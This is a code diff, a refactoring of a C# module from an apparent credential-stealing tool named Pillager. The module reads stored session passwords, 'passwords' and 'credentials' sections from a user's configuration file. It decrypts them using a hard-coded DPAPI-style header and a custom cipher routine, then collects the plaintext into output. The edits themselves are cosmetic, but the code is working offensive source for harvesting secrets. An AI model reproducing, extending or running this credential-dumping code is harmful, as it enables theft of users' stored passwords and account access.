@@ -1,12 +1,12 @@
-﻿using Microsoft.Win32;
-using Pillager.Helper;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
+using Microsoft.Win32;
+using Pillager.Helper;
 
 namespace Pillager.Tools
 {
@@ -26,9 +26,8 @@ namespace Pillager.Tools
                     if (string.IsNullOrEmpty(SessionP)) continue;
                     string Sesspasses = p.Get((Environment.UserName + "@" + Environment.MachineName).Replace(" ",""), "Sesspass", "");
 
-                    List<IniLine> passwords;
                     List<string> passwordlist = new List<string>();
-                    p.sectionMap.TryGetValue("passwords", out passwords);
+                    p.sectionMap.TryGetValue("passwords", out var passwords);
                     if (passwords!=null)
                     {
                         foreach (var password in passwords)
@@ -51,10 +50,9 @@ namespace Pillager.Tools
                             catch { }
                         }
                     }
-                    
-                    List<IniLine> credentials;
+
                     List<string> credentiallist = new List<string>();
-                    p.sectionMap.TryGetValue("credentials", out credentials);
+                    p.sectionMap.TryGetValue("credentials", out var credentials);
                     if (credentials!=null)
                     {
                         foreach (var credential in credentials)
@@ -166,7 +164,7 @@ namespace Pillager.Tools
                     }
                 }
                 catch { }
-                if (passwordlist?.Count > 0)
+                if (passwordlist.Count > 0)
                 {
                     stringBuilder.AppendLine("Passwords:");
                     foreach (var password in passwordlist)
@@ -175,7 +173,7 @@ namespace Pillager.Tools
                     }
                     stringBuilder.AppendLine("");
                 }
-                if (credentiallist?.Count > 0)
+                if (credentiallist.Count > 0)
                 {
                     stringBuilder.AppendLine("Credentials:");
                     foreach (var credential in credentiallist)
@@ -194,7 +192,7 @@ namespace Pillager.Tools
         {
             byte[] bytes = Convert.FromBase64String(Sesspasses);
             //byte[] key = KeyCrafter(SessionP);
-            byte[] front = new byte[] { 0x01, 0x00, 0x00, 0x00, 0xd0, 0x8c, 0x9d, 0xdf, 0x01, 0x15, 0xd1, 0x11, 0x8c, 0x7a, 0x00, 0xc0, 0x4f, 0xc2, 0x97, 0xeb };
+            byte[] front = { 0x01, 0x00, 0x00, 0x00, 0xd0, 0x8c, 0x9d, 0xdf, 0x01, 0x15, 0xd1, 0x11, 0x8c, 0x7a, 0x00, 0xc0, 0x4f, 0xc2, 0x97, 0xeb };
             byte[] all = new byte[bytes.Length + front.Length];
             for (int i = 0; i < front.Length; i++)
             {
@@ -227,11 +225,11 @@ namespace Pillager.Tools
             byte[] text = Encoding.ASCII.GetBytes(Ciphertext);
 
             List<byte> bytes1 = new List<byte>();
-            for (int i = 0; i < text.Length; i++)
+            foreach (var t in text)
             {
-                if (key.ToList().Contains(text[i]))
+                if (key.ToList().Contains(t))
                 {
-                    bytes1.Add(text[i]);
+                    bytes1.Add(t);
                 }
             }
             byte[] ct = bytes1.ToArray();
@@ -240,7 +238,6 @@ namespace Pillager.Tools
 
             if (ct.Length % 2 == 0)
             {
-                List<byte> bytes2 = new List<byte>();
                 for (int i = 0; i < ct.Length; i += 2)
                 {
                     int l = key.ToList().FindIndex(a => a == ct[i]);
